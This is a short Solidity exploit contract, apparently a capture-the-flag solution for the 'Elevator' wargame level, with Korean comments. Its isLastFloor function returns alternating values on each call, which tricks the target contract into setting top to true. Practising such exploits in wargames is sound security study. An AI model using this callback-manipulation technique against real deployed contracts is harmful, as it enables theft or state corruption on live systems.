// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint256) external ;
}

contract BuildingAttack {
    bool public toggle = true;
    Elevator elevator;
    
    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }
    
    function isLastFloor(uint256) external returns (bool) {
        toggle = !toggle;  // 호출마다 반대 값 반환
        return toggle;
    }
    
    function attack() public {
        elevator.goTo(63000000000);
        // 결과: top = true
    }
}